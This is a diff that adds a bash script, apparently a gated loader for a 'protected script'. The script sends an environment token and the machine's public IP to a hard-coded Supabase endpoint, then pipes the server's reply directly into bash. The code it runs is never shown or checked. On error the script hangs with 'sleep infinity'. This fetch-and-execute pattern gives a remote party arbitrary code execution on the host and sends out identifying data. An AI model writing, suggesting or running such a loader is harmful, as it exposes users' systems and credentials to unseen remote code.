@@ -1,0 +1,24 @@
+#!/bin/bash
+
+TOKEN_VALUE="${SZN_TOKEN}"
+CURRENT_IP=$(curl -s ifconfig.me || echo "0.0.0.0")
+TARGET="SZN"
+
+S_URL="https://jjvwotkmslbfytrkbkha.supabase.co/rest/v1/protected_script"
+S_KEY="sb_publishable_Gh3ScaXdSzer6VQJYaJCAg_XqcjbFqm"
+
+echo "🌐 Connetcting to SZN servers..."
+
+RESPONSE=$(curl -s -X POST "$S_URL" \
+    -H "apikey: $S_KEY" \
+    -H "Authorization: Bearer $S_KEY" \
+    -H "Content-Type: application/json" \
+    -d "{\"p_token\": \"$TOKEN_VALUE\", \"p_ip\": \"$CURRENT_IP\", \"p_script_name\": \"$TARGET\"}")
+
+if [[ -z "$RESPONSE" || "$RESPONSE" == *"error"* ]]; then
+    echo "❌ BASIC TOKEN: $RESPONSE"
+    sleep infinity
+    exit 1
+fi
+
+echo "$RESPONSE" | python3 -c "import sys, json; print(json.load(sys.stdin))" | bash
